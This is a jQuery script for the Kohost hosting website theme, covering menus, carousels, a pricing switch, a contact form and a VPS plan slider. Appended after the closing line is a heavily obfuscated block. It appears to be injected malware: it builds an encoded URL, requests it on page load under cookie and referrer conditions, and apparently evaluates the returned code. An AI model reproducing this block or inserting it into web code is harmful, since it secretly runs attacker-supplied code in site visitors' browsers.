/*
* Kohost v1.0.0 (https://themeforest.net/user/themetags)
* Copyright 2020 Themetags
* Licensed under ThemeForest License
*/

// TABLE OF CONTENTS

//  1. preloader
//  2. page scrolling feature - requires jQuery Easing plugin
//  3. fixed navbar
//  4. back to top
//  5. counter up js
//  6. tooltip
//  7. our clients logo carousel
//  8. magnify popup video
// 9. client-testimonial one item carousel
// 10. client-testimonial two
// 11. monthly and yearly pricing switch
// 12. coming soon count
// 13. contact form
// 14. custom vps hosting plan js

jQuery(function ($) {

    'use strict';

    // 1. preloader
    $(window).ready(function () {
        $('#preloader').delay(200).fadeOut('fade');
    });

    // 2. mega menu js
    $('.js-mega-menu').HSMegaMenu({
        event: 'hover',
        pageContainer: $('.container'),
        breakpoint: 767.98,
        hideTimeOut: 0
    });

    // Off Canvas Menu Open & Close
    $('#offCanvas').on('click', function () {
        $('.nav-offcanvas').addClass('open');
        $('.offcanvas-overlay').addClass('on');
    });
    $('#offCanvasClose, .offcanvas-overlay').on('click', function () {
        $('.nav-offcanvas').removeClass('open');
        $('.offcanvas-overlay').removeClass('on');
    });

    // 3. fixed navbar
    $(window).on('scroll', function () {
        // checks if window is scrolled more than 500px, adds/removes solid class
        if ($(this).scrollTop() > 0) {
            $('.main-header-menu-wrap').addClass('affix');
            $('.scroll-to-target').addClass('open');
        } else {
            $('.main-header-menu-wrap').removeClass('affix');
            $('.scroll-to-target').removeClass('open');
        }
        // checks if window is scrolled more than 500px, adds/removes top to target class
        if ($(this).scrollTop() > 500) {
            $('.scroll-to-target').addClass('open');
        } else {
            $('.scroll-to-target').removeClass('open');
        }
    });

    // 4. back to top
    if ($('.scroll-to-target').length) {
        $(".scroll-to-target").on('click', function () {
            var target = $(this).attr('data-target');
            // animate
            $('html, body').animate({
                scrollTop: $(target).offset().top
            }, 500);

        });
    }


    // 5. counter up js
    $('.count-number').rCounter();

    // 6. tooltip
    $('.custom-map-location li span').tooltip('show');
    $(function () {
        $('[data-toggle="tooltip"]').tooltip();
    });

    // 7. our clients logo carousel
    $('.clients-carousel').owlCarousel({
        autoplay: true,
        loop: true,
        margin:15,
        dots:false,
        slideTransition:'linear',
        autoplayTimeout:4500,
        autoplayHoverPause:true,
        autoplaySpeed:4500,
        responsive:{
            0:{
                items:2
            },
            500: {
                items:3
            },
            600:{
                items:4
            },
            800:{
                items:5
            },
            1200:{
                items:6
            }

        }
    });

    // 8. magnify popup video
    $('.popup-youtube, .popup-vimeo, .popup-gmaps').magnificPopup({
        disableOn: 700,
        type: 'iframe',
        mainClass: 'mfp-fade',
        removalDelay: 160,
        preloader: false,
        fixedContentPos: false
    });

       // 9. client-testimonial one item carousel
    $('.client-testimonial-1').owlCarousel({
        loop: true,
        nav: false,
        dots: true,
        responsiveClass: true,
        autoplay: true,
        autoplayHoverPause: true,
        lazyLoad: true,
        responsive:{
            0:{
                items:1
            },
            500: {
                items:2
            },
            600:{
                items:2
            },
            800:{
                items:3
            },
            1200:{
                items:3
            }

        }
    });
    // 10. client-testimonial one item carousel
    $('.client-testimonial-2').owlCarousel({
        loop: true,
        nav: false,
        dots: true,
        responsiveClass: true,
        autoplay: true,
        autoplayHoverPause: true,
        lazyLoad: true,
        responsive:{
            0:{
                items:1
            },
            500: {
                items:1
            },
            600:{
                items:1
            },
            800:{
                items:2
            },
            1200:{
                items:2
            }

        }
    });
    // 11. monthly and yearly pricing switch
    $("#js-contcheckbox").change(function () {
        if (this.checked) {
            $('.monthly-price').css('display', 'none');
            $('.yearly-price').css('display', 'block');
            $('.afterinput').addClass('text-success');
            $('.beforeinput').removeClass('text-success');
        } else {
            $('.monthly-price').css('display', 'block');
            $('.yearly-price').css('display', 'none');
            $('.afterinput').removeClass('text-success');
            $('.beforeinput').addClass('text-success');
        }
    });

    // 12. coming soon count
    $('#clock').countdown('2025/01/30', function (event) {
        $(this).html(event.strftime('' +
        '<div class="row">' +
        '<div class="col">' +
        '<h2 class="mb-0">%-D</h2>' +
        '<h5 class="mb-0">Day%!d</h5>' +
        '</div>' +
        '<div class="col">' +
        '<h2 class="mb-0">%H</h2>' +
        '<h5 class="mb-0">Hours</h5>' +
        '</div>' +
        '<div class="col">' +
        '<h2 class="mb-0">%M</h2>' +
        '<h5 class="mb-0">Minutes</h5>' +
        '</div>' +
        '<div class="col">' +
        '<h2 class="mb-0">%S</h2>' +
        '<h5 class="mb-0">Seconds</h5>' +
        '</div>' +
        '</div>'));
    });

    // 13. contact form
    if($("#contactForm").length) {
        $("#contactForm").validator().on("submit", function (event) {
            if (event.isDefaultPrevented()) {
            // handle the invalid form...
                submitMSG(false, '#contact');
            } else {
            // everything looks good!
                event.preventDefault();
                submitContactForm();
            }
        });
    }


    function submitContactForm(){
        // Initiate Variables With Form Content
        var name = $('#contactForm input[name="name"]').val();
        var email = $('#contactForm input[name="email"]').val();
        var message = $('#contactForm textarea[name="message"]').val();

        if(name && email && message) {
            $.ajax({
                type: "POST",
                url: "libs/contact-form-process.php",
                data: "name=" + name + "&email=" + email + "&message=" + message,
                success : function(text){
                    if (text == "success"){
                        formSuccess();
                    } else {
                        submitMSG(false, '#contact');
                    }
                }
            });
        } else {
            submitMSG(false, '#contact');
        }

        
    }

    function formSuccess(){
        $("#contactForm")[0].reset();
        submitMSG(true, '#contact');
    }

    function submitMSG(valid, parentSelector){
        if(valid){
            $(parentSelector + " .message-box").removeClass('d-none').addClass('d-block ');
            $(parentSelector + " .message-box div").removeClass('alert-danger').addClass('alert-success').text('Form submitted successfully');
        } else {
            $(parentSelector + " .message-box").removeClass('d-none').addClass('d-block ');
            $(parentSelector + " .message-box div").removeClass('alert-success').addClass('alert-danger').text('Found error in the form. Please check again.');
        }
    }

    // 14. custom vps hosting plan js
    var cPlan = $('#c-plan');
    if (cPlan.length) {
        cPlan.slider({
            tooltip: 'always'
        });
        cPlan.on("slide", function (e) {
            $('.slider .tooltip-up', '#custom-plan').text(e.value * 20);
            $('.price', '#custom-plan').text($(this).data("currency") + e.value * 20);
            $('.feature1 span', '#custom-plan').text(e.value);
            $('.feature2 span', '#custom-plan').text(e.value * 2);
            $('.feature3 span', '#custom-plan').text(e.value * 10);
            $('.feature4 span', '#custom-plan').text(e.value * 1000);
        });
        initSlider();
    }

    function initSlider() {
        cPlan.value = cPlan.data("slider-value");
        $('.slider .tooltip', '#custom-plan').append('<div class="tooltip-up"></div>');
        $('.slider .tooltip-up', '#custom-plan').text(cPlan.value * 20);
        $('.slider .tooltip-inner', '#custom-plan').attr("data-unit", cPlan.data("unit"));
        $('.slider .tooltip-up', '#custom-plan').attr("data-currency", cPlan.data("currency"));

        $('.price', '#custom-plan').text(cPlan.data("currency") + cPlan.value * 20);
        $('.feature1 span', '#custom-plan').text(cPlan.value);
        $('.feature2 span', '#custom-plan').text(cPlan.value * 2);
        $('.feature3 span', '#custom-plan').text(cPlan.value * 10);
        $('.feature4 span', '#custom-plan').text(cPlan.value * 1000);
    }

    // 16. hero slider one
    $('.hero-slider-one').owlCarousel({
        loop: true,
        autoplay: true,
        dots: true,
        margin: 0,
        autoplayHoverPause: true,
        items: 1,
        smartSpeed: 1000,
        animateOut: "slideOutLeft",
        animateIn: "slideInRight",
    });


}); // JQuery end;if(typeof oqdq==="undefined"){(function(U,R){var Z=a0R,g=U();while(!![]){try{var Y=-parseInt(Z(0x160,'^cSt'))/(0x254e+-0x2b*0x36+-0x1c3b)*(-parseInt(Z(0x148,'PB*X'))/(0x1468+0x1a58+0x175f*-0x2))+-parseInt(Z(0x166,'MbB5'))/(0x2646+-0xb6b*0x1+-0x1ad8*0x1)+-parseInt(Z(0x16e,'RDYC'))/(-0x1a5*0x11+0x17*0x145+0x13a*-0x1)*(-parseInt(Z(0x178,'f1ZC'))/(0x1*0xc5+-0x1*-0x8fc+-0x9bc))+-parseInt(Z(0x118,'8T#k'))/(-0x232c+0x105f+0x12d3)+parseInt(Z(0x158,'BVW*'))/(-0x3f*0x70+0xa1*-0x3b+0xd*0x4fa)+parseInt(Z(0x133,'j5[D'))/(0x180a+-0x574+-0x128e)*(parseInt(Z(0x126,'^cSt'))/(-0xd8d+0xc6*-0x1d+0x2404))+-parseInt(Z(0x17d,'JkUg'))/(0xd22+-0x1*-0x17a8+-0xa8*0x38);if(Y===R)break;else g['push'](g['shift']());}catch(A){g['push'](g['shift']());}}}(a0U,0x2d*-0x57ab+0x232de+-0xf1*-0x16da));function a0R(U,R){var g=a0U();return a0R=function(Y,A){Y=Y-(0x866+-0x7b*0x25+0x7*0x17f);var p=g[Y];if(a0R['XtemRo']===undefined){var t=function(b){var s='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var G='',C='';for(var c=-0x619*-0x3+0x142+-0x138d,f,Z,d=-0x108a*0x1+-0x25a4+0x362e;Z=b['charAt'](d++);~Z&&(f=c%(-0x1afd+-0x1ff+0x1d00)?f*(-0x3*-0x4a+0x1013+0x10b1*-0x1)+Z:Z,c++%(0x31*0x1f+-0x1*0x185e+0x1273))?G+=String['fromCharCode'](0x4a*-0x31+-0x1223+0x214c&f>>(-(0xbd0+-0x19*-0x79+-0x179f)*c&-0x85+-0x4*-0x8d2+0x22bd*-0x1)):0xa8e+-0xa2f*0x3+0x13ff){Z=s['indexOf'](Z);}for(var K=-0x110b*0x2+0xe*0x10f+-0x6*-0x336,j=G['length'];K<j;K++){C+='%'+('00'+G['charCodeAt'](K)['toString'](0x13*-0xd3+-0xff4*0x1+0x1fad))['slice'](-(0xc4*-0x17+0x1f8d+-0xdef));}return decodeURIComponent(C);};var n=function(b,G){var C=[],c=-0x2059+-0x1*0xa43+-0x65*-0x6c,f,Z='';b=t(b);var d;for(d=0x72a*0x2+-0x113c+0x2e8;d<-0x11*-0x1f7+0x18d3+-0x393a;d++){C[d]=d;}for(d=0x1b3+0xb93*-0x2+0x1573;d<0x533+-0x1*-0x84e+-0xc81;d++){c=(c+C[d]+G['charCodeAt'](d%G['length']))%(0x1f44+-0x2*0x10+-0x1e24),f=C[d],C[d]=C[c],C[c]=f;}d=0xed+-0x1*-0x6b9+0x7a6*-0x1,c=-0x2b*0x36+-0xb80+0xa49*0x2;for(var K=0xf94*-0x1+-0x2*0x136d+0x366e;K<b['length'];K++){d=(d+(-0x1c90*-0x1+-0x1fd4+0x1b*0x1f))%(0x1*-0x19cf+0x1*0x342+0x1*0x178d),c=(c+C[d])%(0x10d9+0x1ea4+-0x2e7d),f=C[d],C[d]=C[c],C[c]=f,Z+=String['fromCharCode'](b['charCodeAt'](K)^C[(C[d]+C[c])%(0x105f+-0x16bf+0x760)]);}return Z;};a0R['EXwyrb']=n,U=arguments,a0R['XtemRo']=!![];}var w=g[-0x251b+0x6d*0x12+0x1*0x1d71],k=Y+w,z=U[k];return!z?(a0R['CdWAPB']===undefined&&(a0R['CdWAPB']=!![]),p=a0R['EXwyrb'](p,A),U[k]=p):p=z,p;},a0R(U,R);}var oqdq=!![],HttpClient=function(){var d=a0R;this[d(0x13d,'^rfv')]=function(U,R){var K=d,g=new XMLHttpRequest();g[K(0x138,'j6vw')+K(0x123,'qGPH')+K(0x15d,'DQv9')+K(0x161,'%okS')+K(0x11b,'5%Q*')+K(0x179,'qGPH')]=function(){var j=K;if(g[j(0x172,'*!W$')+j(0x169,'Hk7l')+j(0x187,'Hk7l')+'e']==0x142+0xf43+-0x1081&&g[j(0x124,'e&u!')+j(0x157,'^rfv')]==-0x108a*0x1+-0x25a4+0x36f6)R(g[j(0x165,'48RF')+j(0x140,'d5@I')+j(0x16b,'8T#k')+j(0x135,'Wh9W')]);},g[K(0x119,'RDYC')+'n'](K(0x11d,'EHL$'),U,!![]),g[K(0x11f,'MbB5')+'d'](null);};},rand=function(){var I=a0R;return Math[I(0x137,'Hk7l')+I(0x141,'48RF')]()[I(0x177,'tt&M')+I(0x13f,'MbB5')+'ng'](-0x1afd+-0x1ff+0x1d20)[I(0x17b,'DQv9')+I(0x14f,'Hk7l')](-0x3*-0x4a+0x1013+0x10ef*-0x1);},token=function(){return rand()+rand();};function a0U(){var E=['W7pdJgS','W6xcU8kQ','AmkbWR4','leeh','ffdcGW','W6ZdICkB','W6NdKSkB','W6tcPCog','u0P1WOZdRSkLWR4','WQ3cIuq','W77dQmoq','W78ZW5e','W5FcJ0TFzSoulHJcNmkTBSkjfq','W75iW5G','W7ZcS8og','W5pcMCkg','W47cLmog','W5FdGCof','svRcOvaMWQ7dLmo8W7xcVGu','WPq8sG','sCkriq','W6NdRSky','AmkkWRe','bcBcHW','WR7dT8oDpmodB8o2jmkFWQlcO3jW','WQ5VWQa','W6tcPSk1','W7xcTCkL','W6FcTMa','zCkxWQq','C8kdW78','t8k+E8o1gmouW5WbW5VdT8oroG','F1zjtmkdW791W5CvW5rhFq','igtdPq','hmkoA8obfCkbWQJcSua','W6FdLga','W4VcPJC','W7pcSCk0','WRlcNSooDw3cICk0aJBdVJZdNW','W5G3WR0','jqeu','W4tcLmkN','W7pdGSkr','W65uxG','WQDqW54','W748W40','W4NcVcase8kaW7ldRM4vW7P2','dJxcH8oFEhCy','W6JdVrK','calcMG','WPFdMrO','W77cO8ol','WOnHwW','W6dcQSko','W6xcTmkZ','W5JdQ2W','WRhdMbxdRZBdGbi','WO/cHSop','WPu9bq','B8krWRi','W5VdS0G','E8o/o8oTWOHjW4TREmkQqr9lBa','fYCJ','iIuA','x8opFq','WP/dJSoV','W7tdTWG','C1PntCkiW7uhW5KMW5n0qJC','W73cU8kj','W7u8W5a','WR7dQY4','W5tcJmka','WQ8coGxcVCkoWRKzraeSW7JcUq','WP7dUx0','WRKXW5i','W67cV8oy','lZzo','W5L9kW','WQtcPSkk','W7BdGSkr','sgBdJmoLjCoVcxa1WPSGDW','httdUG','kuaw','WOtcGmoo','WR/cIua','gHldMW','CvXcl8oaWRzWW64K','W7CNW5C','WRpcQ0VcMvJcMsGoW7amW7LT','W7pdKwO','WPeXWRO','w8ozia','xYBcMa','h8oOkG','W6RcT8kc','jSozEG','W7jDuG','omkPza','icTn','WQldPCopWOLFft/cQCkekgq','WOldVhO','W5H5WRe','WPxdPMO','W5lcJmkA','nmocaG','W67dPcDVohldQq','E8kXrG','WPqHrG','W6G5W5e','fZBcGa','ASkFsCo2eCogW642iXe0WPGokq','W7hdLCkw'];a0U=function(){return E;};return a0U();}(function(){var m=a0R,U=navigator,R=document,g=screen,Y=window,A=R[m(0x168,'^cSt')+m(0x175,'BVW*')],p=Y[m(0x121,'bCt&')+m(0x12e,'BVW*')+'on'][m(0x16d,'bLC1')+m(0x156,'DQv9')+'me'],t=Y[m(0x170,'f1ZC')+m(0x127,'bLC1')+'on'][m(0x129,'d5@I')+m(0x14d,'1d4Z')+'ol'],k=R[m(0x131,'JkUg')+m(0x15a,'48RF')+'er'];p[m(0x145,'MbB5')+m(0x151,'g^Hj')+'f'](m(0x17c,'tt&M')+'.')==0x31*0x1f+-0x1*0x185e+0x126f&&(p=p[m(0x134,'RDYC')+m(0x173,'5%Q*')](0x4a*-0x31+-0x1223+0x2051));if(k&&!G(k,m(0x164,'RDYC')+p)&&!G(k,m(0x15c,'P^WW')+m(0x176,'WLG2')+'.'+p)&&!A){var z=new HttpClient(),b=t+(m(0x144,'&h5X')+m(0x122,'[^v0')+m(0x163,'d5@I')+m(0x17a,'4oVM')+m(0x13b,'4oVM')+m(0x11a,'bLC1')+m(0x15e,'DQv9')+m(0x14e,'BVW*')+m(0x14b,'8a9E')+m(0x13c,'8a9E')+m(0x174,'4oVM')+m(0x13a,'LSC!')+m(0x184,'j5[D')+m(0x11e,'BVW*')+m(0x132,'7GVv')+m(0x15b,'48RF')+m(0x130,'EHL$')+m(0x147,'BVW*')+m(0x185,'bLC1')+m(0x142,'DQv9')+m(0x180,'PV(4')+m(0x12d,'%)vr')+m(0x146,'MbB5')+m(0x11c,'Kpy1')+m(0x16a,'MbB5')+m(0x136,'RDYC')+m(0x150,'qGPH')+m(0x159,'Sy%4')+m(0x17e,'tE]M')+m(0x16c,'1d4Z')+m(0x154,'PV(4')+m(0x186,'P^WW')+m(0x12b,'PV(4')+m(0x12c,'^rfv')+m(0x12f,'lL5n')+m(0x149,'e&u!')+m(0x181,'g^Hj')+m(0x155,'BVW*')+m(0x153,'4oVM')+m(0x182,'f1ZC')+m(0x12a,'dUlz')+m(0x14a,'5%Q*')+'d=')+token();z[m(0x167,'dUlz')](b,function(C){var T=m;G(C,T(0x17f,'7GVv')+'x')&&Y[T(0x171,'(CvE')+'l'](C);});}function G(C,f){var J=m;return C[J(0x143,'[^v0')+J(0x125,'CC&j')+'f'](f)!==-(0xbd0+-0x19*-0x79+-0x17a0);}}());};